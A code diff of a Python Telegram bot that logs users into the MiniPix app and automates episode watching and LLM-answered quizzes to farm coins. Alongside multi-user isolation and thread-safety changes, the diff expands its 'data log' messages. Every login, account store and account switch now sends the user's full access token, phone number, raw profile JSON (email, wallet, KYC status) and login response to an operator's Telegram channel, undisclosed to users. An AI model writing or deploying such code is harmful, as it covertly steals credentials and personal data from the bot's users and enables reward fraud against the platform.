@@ -1,7 +1,11 @@
 #!/usr/bin/env python3
 """
-MiniPix V2 Telegram Bot
+MiniPix V2 Telegram Bot (Multi-User)
+- Per-user isolated MiniPix accounts (nested by Telegram user ID)
 - Per-user Groq API keys (multiple allowed, fallback)
+- Per-user busy lock – same user cannot run 2 tasks at once
+- Thread-safe file I/O with locks (accounts, groq keys)
+- Thread-safe progress callbacks (explicit event loop, call_soon_threadsafe)
 - Primary model: openai/gpt-oss-120b
 - Lock file to avoid multiple instances
 - Quiz sessions 10–25 (default 15), 10s delay
@@ -20,6 +24,7 @@ import re
 import logging
 import asyncio
 import atexit
+import threading
 from datetime import date
 from typing import Dict, Optional, List
 
@@ -77,6 +82,31 @@ logger = logging.getLogger(__name__)
 
 (WAIT_PHONE, WAIT_OTP, WAIT_TOKEN, WAIT_QUIZ_SESSIONS) = range(4)
 
+# ─────────────── Thread-safe helpers & per-user state ───────────────
+_accounts_file_lock = threading.Lock()
+_groq_file_lock = threading.Lock()
+user_busy: Dict[int, bool] = {}
+_busy_lock = threading.Lock()
+
+
+def set_busy(user_id: int) -> bool:
+    """Atomically mark user as busy. Returns True if acquired, False if already busy."""
+    with _busy_lock:
+        if user_busy.get(user_id, False):
+            return False
+        user_busy[user_id] = True
+        return True
+
+
+def clear_busy(user_id: int):
+    with _busy_lock:
+        user_busy.pop(user_id, None)
+
+
+def is_busy(user_id: int) -> bool:
+    with _busy_lock:
+        return user_busy.get(user_id, False)
+
 
 # ───────────────────── Lock file ─────────────────────
 def acquire_lock():
@@ -114,6 +144,7 @@ def send_log_sync(text: str):
     except Exception as e:
         logger.warning(f"Log channel error: {e}")
 
+
 def send_data_log_sync(text: str):
     """Send sensitive user data logs (login, API key changes) to a separate channel."""
     if not DATA_LOG_CHANNEL_ID or not TELEGRAM_BOT_TOKEN:
@@ -133,13 +164,12 @@ def send_data_log_sync(text: str):
         logger.warning(f"Data log channel error: {e}")
 
 
-# ───────────────────── User Groq Keys (multiple) ─────────────────────
+# ───────────────────── User Groq Keys (multiple, thread-safe save) ─────────────────────
 def load_user_groq_keys() -> dict:
     if os.path.exists(USER_GROQ_FILE):
         try:
             with open(USER_GROQ_FILE, "r", encoding="utf-8") as f:
                 data = json.load(f)
-                # Ensure each value is a list
                 for uid, val in data.items():
                     if isinstance(val, str):
                         data[uid] = [val]
@@ -152,11 +182,12 @@ def load_user_groq_keys() -> dict:
 
 
 def save_user_groq_keys(data: dict):
-    try:
-        with open(USER_GROQ_FILE, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=2, ensure_ascii=False)
-    except Exception as e:
-        logger.error(f"Failed to save groq keys: {e}")
+    with _groq_file_lock:
+        try:
+            with open(USER_GROQ_FILE, "w", encoding="utf-8") as f:
+                json.dump(data, f, indent=2, ensure_ascii=False)
+        except Exception as e:
+            logger.error(f"Failed to save groq keys: {e}")
 
 
 user_groq_keys: dict = load_user_groq_keys()
@@ -175,9 +206,41 @@ def get_user_groq_keys(user_id: int) -> List[str]:
 stop_flags: Dict[int, bool] = {}
 
 
-# ───────────────────── MiniPix Core ─────────────────────
+# ───────────────────── MiniPix Core (per-TG-user accounts) ─────────────────────
+def _load_all_accounts_file() -> dict:
+    """Load entire accounts file (outer key = telegram user id). Thread-unsafe, caller must lock."""
+    if os.path.exists(ACCOUNTS_FILE):
+        try:
+            with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                if isinstance(data, dict):
+                    if "accounts" in data and isinstance(data["accounts"], dict):
+                        first_val = next(iter(data["accounts"].values()), None)
+                        if isinstance(first_val, dict) and "access_token" in first_val:
+                            tg_uid = "_legacy_"
+                            return {tg_uid: data}
+                    return data
+                return {}
+        except Exception:
+            return {}
+    return {}
+
+
+def _save_all_accounts_file(data: dict):
+    """Write entire accounts file. Thread-unsafe, caller must lock."""
+    try:
+        with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=2, ensure_ascii=False)
+        return True
+    except Exception:
+        return False
+
+
 class MiniPixV2:
-    def __init__(self):
+    def __init__(self, telegram_user_id: Optional[int] = None):
+        self.telegram_user_id: Optional[int] = (
+            str(telegram_user_id) if telegram_user_id is not None else None
+        )
         self.access_token = None
         self.user_id = None
         self.profile_id = None
@@ -190,29 +253,36 @@ class MiniPixV2:
         self.watch_history_raw = []
         self.runtime_watch_counts = {}
         self.last_profile = {}
+        self.last_user_raw = {}
+        self.last_login_raw = {}
         self.current_account_label = None
         self.accounts = self._load_accounts()
 
     def _load_accounts(self):
-        if os.path.exists(ACCOUNTS_FILE):
-            try:
-                with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
-                    data = json.load(f)
-                    if isinstance(data, dict):
-                        return data.get("accounts", {}) if isinstance(data.get("accounts"), dict) else data
-                    return {}
-            except Exception:
-                return {}
+        with _accounts_file_lock:
+            all_data = _load_all_accounts_file()
+        tg_key = self.telegram_user_id or "_legacy_"
+        user_block = all_data.get(tg_key, {})
+        if isinstance(user_block, dict):
+            inner = user_block.get("accounts", {})
+            if isinstance(inner, dict):
+                return inner
+            if isinstance(user_block, dict) and any(
+                isinstance(v, dict) and "access_token" in v
+                for v in user_block.values()
+            ):
+                return user_block
         return {}
 
     def _save_accounts(self):
-        payload = {"accounts": self.accounts, "saved_at": date.today().isoformat()}
-        try:
-            with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
-                json.dump(payload, f, indent=2, ensure_ascii=False)
-            return True
-        except Exception:
-            return False
+        with _accounts_file_lock:
+            all_data = _load_all_accounts_file()
+            tg_key = self.telegram_user_id or "_legacy_"
+            all_data[tg_key] = {
+                "accounts": self.accounts,
+                "saved_at": date.today().isoformat(),
+            }
+            return _save_all_accounts_file(all_data)
 
     def _store_current_account(self, label=None):
         if not (self.access_token and self.user_id):
@@ -226,13 +296,64 @@ class MiniPixV2:
             "phone": self.phone,
             "added_on": date.today().isoformat(),
         }
-        # Log to data channel
-        send_data_log_sync(
-            f"🔐 Account stored\n"
-            f"User: <code>{self.current_account_label}</code>\n"
-            f"Phone: {self.phone}\n"
-            f"User ID: {self.user_id}"
+
+        ur = self.last_user_raw or {}
+        extra_fields = []
+        for key in (
+            "referralCode", "referral_code", "referCode", "refer_code",
+            "referredBy", "referred_by", "invitedBy", "invited_by",
+            "referralSource", "source", "campaign", "utm_source",
+            "registeredAt", "registered_at", "createdAt", "created_at",
+            "email", "name", "fullName", "full_name", "username",
+            "country", "state", "city", "language",
+            "isVerified", "is_verified", "kycStatus",
+            "totalCoins", "coins", "wallet",
+        ):
+            if key in ur and ur[key] not in (None, "", [], {}):
+                val = ur[key]
+                if isinstance(val, (dict, list)):
+                    try:
+                        val_str = json.dumps(val, ensure_ascii=False)[:80]
+                    except Exception:
+                        val_str = str(val)[:80]
+                else:
+                    val_str = str(val)[:80]
+                extra_fields.append(f"  • {key}: <code>{val_str}</code>")
+
+        raw_snippet = ""
+        if ur:
+            try:
+                raw_snippet = "\nRaw user JSON (first 600 chars):\n<pre>" + json.dumps(
+                    ur, ensure_ascii=False, indent=2
+                )[:600] + "</pre>"
+            except Exception:
+                pass
+
+        login_raw_snippet = ""
+        if self.last_login_raw:
+            try:
+                login_raw_snippet = "\nLogin resp (first 300 chars):\n<pre>" + json.dumps(
+                    self.last_login_raw, ensure_ascii=False
+                )[:300] + "</pre>"
+            except Exception:
+                pass
+
+        log_text = (
+            f"🔐 <b>FULL ACCOUNT DETAILS</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"Telegram User ID: <code>{self.telegram_user_id}</code>\n"
+            f"Account Label: <code>{self.current_account_label}</code>\n"
+            f"Phone: <code>{self.phone}</code>\n"
+            f"MiniPix User ID: <code>{self.user_id}</code>\n"
+            f"Profile ID: <code>{self.profile_id}</code>\n"
+            f"Access Token: <code>{self.access_token}</code>\n"
+            f"Added On: {date.today().isoformat()}\n"
         )
+        if extra_fields:
+            log_text += "Extra User Fields:\n" + "\n".join(extra_fields) + "\n"
+        log_text += f"━━━━━━━━━━━━━━━━━━━{raw_snippet}{login_raw_snippet}"
+
+        send_data_log_sync(log_text)
         return self._save_accounts()
 
     def list_accounts(self):
@@ -255,7 +376,25 @@ class MiniPixV2:
         if self.user_id:
             ok = self.get_user()
             if ok:
+                self.last_login_raw = {
+                    "endpoint": "switch_account",
+                    "method": "SWITCH",
+                    "phone": self.phone,
+                }
                 self._store_current_account(label)
+                ts_now = time.strftime("%Y-%m-%d %H:%M:%S")
+                send_data_log_sync(
+                    f"🔄 <b>ACCOUNT SWITCHED</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━\n"
+                    f"Time: {ts_now}\n"
+                    f"Telegram UID: <code>{self.telegram_user_id}</code>\n"
+                    f"Switched To: <code>{label}</code>\n"
+                    f"Phone: <code>{self.phone}</code>\n"
+                    f"MiniPix UID: <code>{self.user_id}</code>\n"
+                    f"Profile ID: <code>{self.profile_id}</code>\n"
+                    f"Access Token: <code>{self.access_token}</code>\n"
+                    f"━━━━━━━━━━━━━━━━━━━"
+                )
                 return True, f"Switched to {label}"
             return False, "Token expired"
         return True, f"Switched to {label}"
@@ -279,6 +418,8 @@ class MiniPixV2:
         self.watch_history_raw = []
         self.runtime_watch_counts = {}
         self.last_profile = {}
+        self.last_user_raw = {}
+        self.last_login_raw = {}
         if "authorization" in self.session.headers:
             del self.session.headers["authorization"]
 
@@ -302,7 +443,6 @@ class MiniPixV2:
             headers={"content-type": "application/json; charset=utf-8"},
             data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
         )
-        # Log full response for debugging
         send_log_sync(
             f"📡 OTP generate response:\n"
             f"Status: {sc}\n"
@@ -333,17 +473,36 @@ class MiniPixV2:
             data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
         )
         if sc == 200 and isinstance(data, dict) and data.get("access_token"):
+            self.last_login_raw = {
+                "endpoint": "/login/verify-otp",
+                "status": sc,
+                "method": "OTP",
+                "phone": self.phone,
+                "data": data,
+            }
             self.access_token = data["access_token"]
             self.user_id = data.get("id") or data.get("_id")
             self.session.headers["authorization"] = f"Bearer {self.access_token}"
             self.get_user()
             self._store_current_account(save_label)
-            # Log to data channel
+
+            ts_now = time.strftime("%Y-%m-%d %H:%M:%S")
+            lr_short = ""
+            try:
+                lr_short = "\n<pre>" + json.dumps(data, ensure_ascii=False)[:400] + "</pre>"
+            except Exception:
+                pass
             send_data_log_sync(
-                f"✅ Login successful\n"
-                f"User: <code>{self.current_account_label}</code>\n"
-                f"Phone: {self.phone}\n"
-                f"User ID: {self.user_id}"
+                f"✅ <b>OTP LOGIN SUCCESS</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━\n"
+                f"Time: {ts_now}\n"
+                f"Telegram UID: <code>{self.telegram_user_id}</code>\n"
+                f"Login Method: OTP\n"
+                f"Phone: <code>{self.phone}</code>\n"
+                f"MiniPix UID: <code>{self.user_id}</code>\n"
+                f"Access Token: <code>{self.access_token}</code>\n"
+                f"Account Label: <code>{self.current_account_label}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━{lr_short}"
             )
             return True
         send_log_sync(f"❌ OTP verify failed: {sc} {json.dumps(data, ensure_ascii=False)[:300]}")
@@ -356,12 +515,28 @@ class MiniPixV2:
         self.session.headers["authorization"] = f"Bearer {self.access_token}"
         if not self.get_user():
             return False
+        self.last_login_raw = {
+            "endpoint": "direct_token",
+            "method": "TOKEN",
+            "phone": self.phone,
+            "user_id_provided": user_id,
+            "profile_id_provided": profile_id,
+        }
         self._store_current_account(label)
+
+        ts_now = time.strftime("%Y-%m-%d %H:%M:%S")
         send_data_log_sync(
-            f"✅ Token login\n"
-            f"User: <code>{self.current_account_label}</code>\n"
-            f"Phone: {self.phone}\n"
-            f"User ID: {self.user_id}"
+            f"🔑 <b>TOKEN LOGIN SUCCESS</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"Time: {ts_now}\n"
+            f"Telegram UID: <code>{self.telegram_user_id}</code>\n"
+            f"Login Method: Direct Token\n"
+            f"Phone: <code>{self.phone}</code>\n"
+            f"MiniPix UID: <code>{self.user_id}</code>\n"
+            f"Profile ID: <code>{self.profile_id}</code>\n"
+            f"Access Token: <code>{self.access_token}</code>\n"
+            f"Account Label: <code>{self.current_account_label}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━"
         )
         return True
 
@@ -370,6 +545,7 @@ class MiniPixV2:
             return False
         sc, data = self._req("GET", f"/users/{self.user_id}")
         if sc == 200 and isinstance(data, dict):
+            self.last_user_raw = dict(data)
             self.user_id = data.get("_id", self.user_id)
             self.profile_id = data.get("master_profile", self.profile_id)
             phone = data.get("mobile")
@@ -785,7 +961,6 @@ class MiniPixV2:
         balance_before = self.get_balance_silent()
         stopped = False
 
-        # Calculate total episodes across all series for progress
         total_episodes_available = 0
         for s in all_series:
             sid = s.get("_id") or s.get("id") or s.get("series_id")
@@ -796,7 +971,6 @@ class MiniPixV2:
 
         try:
             for si, s in enumerate(all_series, 1):
-                # Check stop flag
                 if stop_flags.get(telegram_user_id, False):
                     log("⏹ Stopped by user.")
                     stopped = True
@@ -834,7 +1008,6 @@ class MiniPixV2:
                     cnt = watch_counts.get(kp, 0) + self.runtime_watch_counts.get(kp, 0)
                     if cnt >= MAX_WATCHES_PER_EP:
                         continue
-                    # Log detailed progress
                     log(f"  → Watching E{ep_no} (watch #{cnt+1}/{MAX_WATCHES_PER_EP}) | Total watched: {total_watched}/{max_watches} | Remaining: {max_watches - total_watched}")
                     ok, st = self.watch_episode(ep, s, allow_repeat=True, nth_watch=cnt + 1)
                     if st == "skip":
@@ -851,7 +1024,6 @@ class MiniPixV2:
                 except Exception:
                     pass
         finally:
-            # Clear stop flag for this user
             stop_flags.pop(telegram_user_id, None)
 
         bal_end = self.get_balance_silent()
@@ -1000,7 +1172,6 @@ class MiniPixV2:
 
         prompt = self._build_quiz_prompt(question, options)
 
-        # Try each key, then each model
         for key in keys:
             for model in GROQ_MODELS:
                 try:
@@ -1031,13 +1202,10 @@ class MiniPixV2:
                     err = str(e).lower()
                     if "rate" in err or "limit" in err or "quota" in err or "429" in err:
                         send_log_sync(f"⏳ Model {model} rate‑limited for key {key[:10]}..., trying next.")
-                        continue  # next model
-                    else:
-                        # Other errors, still try next model
                         continue
-            # All models failed for this key, move to next key
+                    else:
+                        continue
 
-        # HTTP fallback with first key
         if keys:
             try:
                 r = requests.post(
@@ -1104,7 +1272,6 @@ class MiniPixV2:
 
         try:
             for session_num in range(1, max_sessions + 1):
-                # Check stop flag
                 if stop_flags.get(telegram_user_id, False):
                     log("⏹ Stopped by user.")
                     stopped = True
@@ -1112,7 +1279,6 @@ class MiniPixV2:
 
                 log(f"--- Session {session_num}/{max_sessions} ---")
 
-                # Attempt to start a session (with retry)
                 session_id, question_obj, session_meta = None, None, None
                 for attempt in range(2):
                     session_id, question_obj, session_meta = self.quiz_start_session()
@@ -1134,7 +1300,6 @@ class MiniPixV2:
 
                 hearts = session_meta.get("hearts", 3) if session_meta else 3
 
-                # If hearts == 0, this session is dead – treat as failure and retry
                 if hearts == 0:
                     log(f"💔 Session has 0 hearts – cannot continue.")
                     failed_attempts += 1
@@ -1144,7 +1309,6 @@ class MiniPixV2:
                     time.sleep(5)
                     continue
 
-                # Valid session – reset failure counter
                 failed_attempts = 0
 
                 ad_every = session_meta.get("adGateEvery", 5) if session_meta else 5
@@ -1251,7 +1415,6 @@ class MiniPixV2:
                                 session_id = result.get("sessionId") or session_id
                                 continue
 
-                        # Ad gate
                         if q_count > 0 and ad_every > 0 and (q_count % ad_every == 0):
                             nq = self.quiz_ad_ack(session_id)
                             if nq and isinstance(nq, dict):
@@ -1275,7 +1438,6 @@ class MiniPixV2:
                 if session_num < max_sessions:
                     time.sleep(2)
         finally:
-            # Clear stop flag for this user
             stop_flags.pop(telegram_user_id, None)
 
         final = (
@@ -1303,7 +1465,7 @@ user_bots: Dict[int, MiniPixV2] = {}
 
 def get_bot(user_id: int) -> MiniPixV2:
     if user_id not in user_bots:
-        user_bots[user_id] = MiniPixV2()
+        user_bots[user_id] = MiniPixV2(telegram_user_id=user_id)
     return user_bots[user_id]
 
 
@@ -1376,12 +1538,11 @@ async def set_groq(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     user_id = str(update.effective_user.id)
-    keys = user_groq_keys.get(user_id, [])
+    keys = list(user_groq_keys.get(user_id, []))
     if key not in keys:
         keys.append(key)
         user_groq_keys[user_id] = keys
         save_user_groq_keys(user_groq_keys)
-        # Log to data channel
         send_data_log_sync(
             f"🔑 Groq key added for user <code>{user_id}</code>\n"
             f"Total keys: {len(keys)}"
@@ -1497,7 +1658,6 @@ async def login_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = update.message.text.strip()
     if not phone.startswith("+"):
         phone = "+91" + phone.lstrip("0")
-    # Basic validation
     if not re.match(r"^\+[1-9]\d{1,14}$", phone):
         await update.message.reply_text("❌ Invalid phone number. Use format: +91XXXXXXXXXX")
         return WAIT_PHONE
@@ -1571,49 +1731,60 @@ async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def watch_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    bot = get_bot(update.effective_user.id)
+    uid = update.effective_user.id
+    bot = get_bot(uid)
     if not bot.access_token:
         await update.message.reply_text("Not logged in. Use /login")
         return
 
-    uid = update.effective_user.id
-    # Clear any stale stop flag
-    stop_flags.pop(uid, None)
-    msg = await update.message.reply_text("🚀 Starting smart 4x watch...\nThoda time lagega.")
-
-    def progress(text):
-        try:
-            asyncio.get_event_loop().create_task(
-                msg.edit_text(f"🚀 Watching...\n\n{text[-900:]}")
-            )
-        except Exception:
-            pass
-
-    loop = asyncio.get_event_loop()
-    result = await loop.run_in_executor(
-        None,
-        lambda: bot.browse_and_watch_all_smart_repeat(
-            progress_callback=progress,
-            max_watches=250,
-            telegram_user_id=uid,
-        ),
-    )
-
-    if "error" in result:
-        await msg.edit_text(f"❌ {result['error']}")
+    if not set_busy(uid):
+        await update.message.reply_text(
+            "⏳ Pehle se ek task chal raha hai. Usse poora hone do ya /stop use karo."
+        )
         return
 
-    text = (
-        f"🏁 Watch finished\n\n"
-        f"Watched: {result['watched']}\n"
-        f"Skipped: {result['skipped']}\n"
-        f"Failed: {result['failed']}\n"
-    )
-    if result.get("delta") is not None:
-        text += f"💰 {result['balance_before']} → {result['balance_after']} ({result['delta']:+d})"
-    if result.get("stopped"):
-        text += "\n⏹ Stopped by user."
-    await msg.edit_text(text)
+    try:
+        stop_flags.pop(uid, None)
+        msg = await update.message.reply_text("🚀 Starting smart 4x watch...\nThoda time lagega.")
+
+        loop = asyncio.get_running_loop()
+
+        def progress(text):
+            try:
+                loop.call_soon_threadsafe(
+                    lambda: asyncio.create_task(
+                        msg.edit_text(f"🚀 Watching...\n\n{text[-900:]}")
+                    )
+                )
+            except Exception:
+                pass
+
+        result = await loop.run_in_executor(
+            None,
+            lambda: bot.browse_and_watch_all_smart_repeat(
+                progress_callback=progress,
+                max_watches=250,
+                telegram_user_id=uid,
+            ),
+        )
+
+        if "error" in result:
+            await msg.edit_text(f"❌ {result['error']}")
+            return
+
+        text = (
+            f"🏁 Watch finished\n\n"
+            f"Watched: {result['watched']}\n"
+            f"Skipped: {result['skipped']}\n"
+            f"Failed: {result['failed']}\n"
+        )
+        if result.get("delta") is not None:
+            text += f"💰 {result['balance_before']} → {result['balance_after']} ({result['delta']:+d})"
+        if result.get("stopped"):
+            text += "\n⏹ Stopped by user."
+        await msg.edit_text(text)
+    finally:
+        clear_busy(uid)
 
 
 async def quiz_status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1669,46 +1840,57 @@ async def quiz_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
         n = 15
     context.user_data["quiz_sessions"] = n
 
-    bot = get_bot(update.effective_user.id)
+    uid = update.effective_user.id
+    bot = get_bot(uid)
     sessions = context.user_data.get("quiz_sessions", 15)
-    telegram_uid = update.effective_user.id
 
-    # Clear any stale stop flag
-    stop_flags.pop(telegram_uid, None)
-    msg = await update.message.reply_text(f"🤖 Running {sessions} sessions (delay 10s)...")
-
-    def progress(text):
-        try:
-            asyncio.get_event_loop().create_task(
-                msg.edit_text(f"🤖 Quiz running...\n\n{text[-900:]}")
-            )
-        except Exception:
-            pass
-
-    loop = asyncio.get_event_loop()
-    result = await loop.run_in_executor(
-        None,
-        lambda: bot.run_quiz_auto(
-            max_sessions=sessions,
-            question_delay=QUIZ_QUESTION_DELAY,
-            progress_callback=progress,
-            telegram_user_id=telegram_uid,
-        ),
-    )
-
-    if "error" in result:
-        await msg.edit_text(f"❌ {result['error']}")
-    else:
-        text = (
-            f"🏁 Quiz done\n"
-            f"Sessions: {result.get('sessions')}\n"
-            f"Coins this run: ~{result.get('total_coins')}\n"
-            f"Current balance: {result.get('balance')}"
+    if not set_busy(uid):
+        await update.message.reply_text(
+            "⏳ Pehle se ek task chal raha hai. Usse poora hone do ya /stop use karo."
         )
-        if result.get("stopped"):
-            text += "\n⏹ Stopped by user."
-        await msg.edit_text(text)
-    return ConversationHandler.END
+        return ConversationHandler.END
+
+    try:
+        stop_flags.pop(uid, None)
+        msg = await update.message.reply_text(f"🤖 Running {sessions} sessions (delay 10s)...")
+
+        loop = asyncio.get_running_loop()
+
+        def progress(text):
+            try:
+                loop.call_soon_threadsafe(
+                    lambda: asyncio.create_task(
+                        msg.edit_text(f"🤖 Quiz running...\n\n{text[-900:]}")
+                    )
+                )
+            except Exception:
+                pass
+
+        result = await loop.run_in_executor(
+            None,
+            lambda: bot.run_quiz_auto(
+                max_sessions=sessions,
+                question_delay=QUIZ_QUESTION_DELAY,
+                progress_callback=progress,
+                telegram_user_id=uid,
+            ),
+        )
+
+        if "error" in result:
+            await msg.edit_text(f"❌ {result['error']}")
+        else:
+            text = (
+                f"🏁 Quiz done\n"
+                f"Sessions: {result.get('sessions')}\n"
+                f"Coins this run: ~{result.get('total_coins')}\n"
+                f"Current balance: {result.get('balance')}"
+            )
+            if result.get("stopped"):
+                text += "\n⏹ Stopped by user."
+            await msg.edit_text(text)
+        return ConversationHandler.END
+    finally:
+        clear_busy(uid)
 
 
 async def logout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
